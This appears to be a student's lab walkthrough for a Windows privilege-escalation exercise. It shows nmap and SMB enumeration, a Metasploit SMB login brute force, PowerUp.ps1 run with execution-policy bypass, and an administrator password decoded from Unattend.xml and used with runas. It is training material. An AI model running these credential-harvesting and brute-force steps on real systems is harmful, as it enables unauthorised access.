---
up: "[[Windows Credential Dumping]]"
---

# 🧪 Unattended Installation

## Overview

A Kali GUI machine and a Windows machine provided to you. 

Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations.  The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)post-exploitation framework has provided to you on the windows machine.

Objective: Gain access to meterpreter session with high privilege.

Instructions:

- You can check the IP address of the machine by running "ipconfig" command on the command prompt i.e cmd.exe
- Do not attack the gateway located at IP address 10.0.0.1

## Solution

10.2.27.77

```bash
nmap -sV -p- -T5 10.2.27.77
Starting Nmap 7.70 ( https://nmap.org ) at 2024-03-26 20:00 IST
Nmap scan report for 10.2.27.77
Host is up (0.0030s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.57 seconds
```

```bash
smbmap -u guest -p "" -d . -H 10.2.27.77
[+] Finding open SMB ports....
[!] Authentication error on 10.2.27.77
[!] Authentication error on 10.2.27.77
```

```bash
nmap -p 445 --script smb-protocols 10.2.27.77
Starting Nmap 7.70 ( https://nmap.org ) at 2024-03-26 20:02 IST
Nmap scan report for 10.2.27.77
Host is up (0.0025s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```

```bash
$ msfconsole -q
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.2.27.77
RHOSTS => 10.2.27.77
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/smb/smb_login) > run
```

```bash
>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\student\Desktop\PowerSploit\Privesc> . .\PowerUp.ps1
> Invoke-PrivescAudit


ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIV-ESC\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

```bash
> cat C:\Windows\Panther\Unattend.xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="windowsPE">
        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <UserData>
                <ProductKey>
                    <WillShowUI>Always</WillShowUI>
                </ProductKey>
            </UserData>
            <UpgradeData>
                <Upgrade>true</Upgrade>
                <WillShowUI>Always</WillShowUI>
            </UpgradeData>
        </component>
        <component name="Microsoft-Windows-PnpCustomizationsWinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <DriverPaths>
                <PathAndCredentials wcm:keyValue="1" wcm:action="add">
                    <Path>$WinPEDriver$</Path>
                </PathAndCredentials>
            </DriverPaths>
        </component>
    </settings>
    <settings pass="specialize">
        <component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <RunSynchronous>
                <RunSynchronousCommand wcm:action="add">
                    <Order>1</Order>
                    <Path>cmd /c "FOR %i IN (X F E D C) DO (FOR /F "tokens=6" %t in ('vol %i:') do (IF /I %t NEQ "" (IF EXIST %i:\BootCamp\BootCamp.xml Reg ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v AppsRoot /t REG_SZ /d %i /f )))"</Path>
                </RunSynchronousCommand>
            </RunSynchronous>
        </component>
    </settings>
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <FirstLogonCommands>
              <SynchronousCommand wcm:action="add">
                <Description>AMD CCC Setup</Description>
                <CommandLine>%AppsRoot%:\BootCamp\Drivers\ATI\ATIGraphics\Bin64\ATISetup.exe -Install</CommandLine>
                <Order>1</Order>
                <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
              <SynchronousCommand wcm:action="add">
                  <Description>BootCamp setup</Description>
                  <CommandLine>%AppsRoot%:\BootCamp\setup.exe</CommandLine>
                  <Order>2</Order>
                  <RequiresUserInput>false</RequiresUserInput>
              </SynchronousCommand>
            </FirstLogonCommands>
            <AutoLogon>
                <Password>
                    <Value>QWRtaW5AMTIz</Value>
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>administrator</Username>
            </AutoLogon>
        </component>
    </settings>
</unattend>
```

```bash
> $password='QWRtaW5AMTIz'
> $password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
> echo $password
Admin@123
```

```bash
runas.exe /user:administrator cmd
password: Admin@123
```

```bash
C:\Windows\system32>whoami
priv-esc\administrator

C:\Windows\system32>
```

```bash

```

![[Pasted image 20240326161157.png]]
